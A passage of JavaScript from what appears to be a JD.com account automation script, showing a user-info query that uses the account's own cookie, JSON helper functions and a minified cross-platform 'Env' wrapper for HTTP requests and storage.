        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      "url": `https://wq.jd.com/user/info/QueryJDUserInfo?sceneval=2`,
      "headers": {
        "Accept": "application/json,text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-cn",
        "Connection": "keep-alive",
        "Cookie": cookie,
        "Referer": "https://wqs.jd.com/my/jingdou/my.shtml?sceneval=2",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0")
      }
    }
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === 13) {
              $.isLogin = false; //cookie过期
              return
            }
            if (data['retcode'] === 0) {
              $.nickName = data['base'].nickname;
            } else {
              $.nickName = $.UserName
            }
          } else {
            console.log(`京东服务器返回空数据`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function safeGet(data) {
  try {
    if (typeof JSON.parse(data) == "object") {
      return true;
    }
  } catch (e) {
    console.log(e);
    console.log(`京东服务器访问数据为空，请检查自身设备网络情况`);
    return false;
  }
}
function jsonParse(str) {
  if (typeof str == "string") {
    try {
      return JSON.parse(str);
    } catch (e) {
      console.log(e);
      $.msg($.name, '', '请勿随意在BoxJs输入框修改内容\n建议通过脚本去获取cookie')
      return [];
    }
  }
}
// prettier-ignore
function Env(t,e){class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}
